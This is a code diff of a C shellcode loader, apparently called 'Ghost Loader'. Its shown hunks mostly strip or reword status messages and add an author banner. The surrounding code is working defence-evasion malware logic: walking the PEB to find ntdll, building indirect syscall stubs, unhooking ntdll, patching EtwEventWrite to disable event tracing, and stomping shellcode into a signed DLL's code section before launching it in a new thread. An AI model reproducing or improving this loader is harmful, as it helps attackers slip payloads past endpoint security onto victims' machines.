@@ -261,7 +261,6 @@ static BOOL build_syscall_stubs(PVOID ntdll) {
         return FALSE;
     }
 
-    printf("[+] Indirect syscall stubs @ %p\n", page);
     return TRUE;
 }
 
@@ -337,8 +336,7 @@ static BOOL unhook_ntdll(PVOID in_mem_ntdll) {
             paddr = tgt; psize = tgt_size;
             NtProt((HANDLE)-1, &paddr, &psize, old, &old);
 
-            printf("[+] NTDLL .text refreshed — %u bytes (%d hooks wiped)\n",
-                   (unsigned)tgt_size, 0);
+            (void)tgt_size;
             ok = TRUE;
             break;
         }
@@ -369,7 +367,7 @@ static void patch_etw(PVOID ntdll) {
         memcpy(etw, patch, sizeof(patch));
         addr = etw; size = sizeof(patch);
         NtProt((HANDLE)-1, &addr, &size, old, &old);
-        printf("[+] EtwEventWrite patched @ %p\n", etw);
+        printf("[+] ETW patched @ %p\n", etw);
     }
 }
 
@@ -480,7 +478,6 @@ static PVOID stomp(PVOID ntdll, unsigned char *sc, size_t sc_len) {
     st = NtProt((HANDLE)-1, &addr, &size, PAGE_EXECUTE_READ, &old);
     if (st != 0) { printf("[-] NtProtect RX: 0x%08X\n", (unsigned)st); return NULL; }
 
-    printf("[+] Shellcode stomped into legit module\n");
     return text;
 }
 
@@ -500,8 +497,8 @@ static int execute(PVOID entry) {
         printf("[-] NtCreateThreadEx: 0x%08X\n", (unsigned)st);
         return -1;
     }
-    printf("[+] Thread dispatched via indirect syscall\n");
     NtWait(th, FALSE, NULL);
+    printf("\n[+] Done.\n");
     return 0;
 }
 
@@ -531,13 +528,13 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    printf("[*] Ghost Loader — PEB walk + Hell's Gate + Module Stomp\n");
+    printf("\033[31m#Made By Worry.\033[0m\n\n");
 
     // 1. PEB walk — NTDLL base (no LoadLibrary, no imports)
     char nt[] = {'n','t','d','l','l','.','d','l','l',0};
     PVOID ntdll = peb_find(djb2_a(nt));
     if (!ntdll) { printf("[-] NTDLL not in PEB\n"); return 1; }
-    printf("[+] NTDLL @ %p  (via PEB walk)\n", ntdll);
+    printf("[+] NTDLL @ %p\n", ntdll);
 
     // 2. Build our own syscall stubs
     if (!build_syscall_stubs(ntdll)) return 1;
@@ -554,7 +551,6 @@ int main(int argc, char *argv[]) {
     size_t sc_len = 0;
     unsigned char *sc = read_file(argv[1], &sc_len);
     if (!sc) { printf("[-] Read failed: %s\n", argv[1]); return 1; }
-    printf("[+] Shellcode  %zu bytes\n", sc_len);
 
     // 5. Stomp into a legit signed DLL's .text
     PVOID entry = stomp(ntdll, sc, sc_len);
